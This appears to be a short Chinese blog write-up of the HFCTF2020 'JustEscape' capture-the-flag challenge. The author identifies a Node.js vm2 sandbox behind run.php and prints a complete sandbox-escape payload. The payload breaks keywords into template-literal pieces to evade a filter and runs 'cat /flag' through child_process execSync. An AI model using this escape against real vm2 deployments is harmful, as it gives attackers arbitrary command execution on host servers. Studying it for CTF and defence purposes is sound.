---
title: '[HFCTF2020]JustEscape'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-08-26 22:23:46
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/jtyksekjsd.jpg
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/grweaga.jpg)

访问run.php：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/53iui64.jpg)

看似很简单的代码，根据首页的提示，猜测这不只是php。
输入Error().stack
根据回显得到，这是一个JS的vm2，而且经过测试许多关键字都被过滤
搜索可得 vm2 最新沙盒逃逸 poc

payload：
(function (){TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();try{Object.preventExtensions(Buffer.from(``)).a = 1;}catch(e){return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();}})()

这个地方暂时就不去深究了。
